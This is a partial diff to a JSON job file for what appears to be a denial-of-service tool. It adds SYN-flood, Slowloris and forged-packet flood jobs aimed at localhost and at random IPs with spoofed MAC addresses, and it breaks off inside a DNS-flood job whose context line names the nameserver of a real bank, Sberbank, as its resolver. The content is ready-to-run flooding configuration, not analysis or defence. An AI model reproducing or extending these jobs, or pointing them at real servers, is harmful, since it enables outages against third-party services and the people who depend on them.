@@ -43,6 +43,50 @@
     {
       "type": "syn-flood",
       "args": {
+        "host": "localhost",
+        "port": 80,
+        "payload_len": 1000,
+        "flood_type": "random"
+      }
+    },
+    {
+      "type": "slow-loris",
+      "args": {
+        "path": "https://localhost:9090/inc2/common/js/doo/modules/searchSite/u.php"
+      }
+    },
+    {
+      "type": "packetgen",
+      "args": {
+        "host": "{{ random_ip }}",
+        "port": "{{ random_port }}",
+        "packet": {
+          "payload": "test:blah",
+          "ethernet": {
+            "src_mac": "{{ random_mac_addr }}",
+            "dst_mac": "{{ random_mac_addr }}"
+          },
+          "ip": {
+            "src_ip": "{{ local_ip }}",
+            "dst_ip": "{{ random_ip }}"
+          },
+          "tcp": {
+            "src_port": "{{ random_port }}",
+            "dst_port": "{{ random_port }}",
+            "flags": {
+              "syn": true
+            }
+          },
+          "udp": {
+            "src_port": "{{ random_port }}",
+            "dst_port": "{{ random_port }}"
+          }
+        }
+      }
+    },
+    {
+      "type": "dns-flood",
+      "args": {
         "verbose": false,
         "iterative": true,
         "resolver": "ns1.sberbank.ru",
